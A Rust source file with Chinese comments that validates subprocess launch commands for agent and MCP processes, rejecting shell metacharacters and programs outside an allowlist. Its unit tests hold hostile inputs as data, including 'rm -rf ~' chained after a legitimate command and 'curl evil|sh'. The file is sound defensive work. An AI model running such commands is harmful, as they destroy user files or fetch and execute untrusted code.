//! 子进程启动命令守卫：白名单 + shell 元字符拒绝。
//!
//! AcpAgent 与 MCP stdio 探活均按 argv 解析、不经 shell，但元字符意味着配置被
//! 注入或误配，宁可拒绝。白名单收敛的是「能被启动的程序面」，而非完全消除该面
//! （node/npx 等通用运行时本身可执行任意包）。

use std::path::Path;

/// 这些字符出现在启动串里即拒绝。
pub const SHELL_META_CHARS: &[char] = &['|', '&', ';', '<', '>', '$', '`', '(', ')', '\n', '\r'];

/// 启动命令白名单校验；返回规范化后的命令（trim 非空 → 元字符检查 →
/// 首 token basename 匹配 allowlist → 裸名或绝对路径校验）。
pub fn validate_spawn_command(raw: &str, allowed_programs: &[&str]) -> Result<String, String> {
    let trimmed = raw.trim();
    if trimmed.is_empty() {
        return Err("spawn command is empty".to_string());
    }
    if let Some(found) = trimmed.chars().find(|c| SHELL_META_CHARS.contains(c)) {
        return Err(format!(
            "spawn command contains forbidden character {found:?}"
        ));
    }
    let program = trimmed.split_whitespace().next().unwrap_or_default();
    let basename = program.rsplit(['/', '\\']).next().unwrap_or(program);
    if program != basename && !Path::new(program).is_absolute() {
        return Err(format!(
            "spawn program must be a bare name or absolute path: {program}"
        ));
    }
    if !allowed_programs.contains(&basename) {
        return Err(format!(
            "spawn program '{basename}' is not in the allowed list"
        ));
    }
    Ok(trimmed.to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    const ALLOWED: &[&str] = &["opencode", "node", "npx"];

    #[test]
    fn allows_known_programs_and_rejects_injection() {
        assert_eq!(
            validate_spawn_command("opencode acp", ALLOWED).unwrap(),
            "opencode acp"
        );
        assert!(validate_spawn_command("npx -y @zed-industries/claude-code-acp", ALLOWED).is_ok());
        assert!(validate_spawn_command("opencode acp && rm -rf ~", ALLOWED).is_err());
        assert!(validate_spawn_command("curl evil|sh", ALLOWED).is_err());
        assert!(validate_spawn_command("opencode acp; curl evil", ALLOWED).is_err());
        assert!(validate_spawn_command("./evil --serve", ALLOWED).is_err());
        assert!(validate_spawn_command("malicious-agent acp", ALLOWED).is_err());
        assert!(validate_spawn_command("   ", ALLOWED).is_err());
    }
}
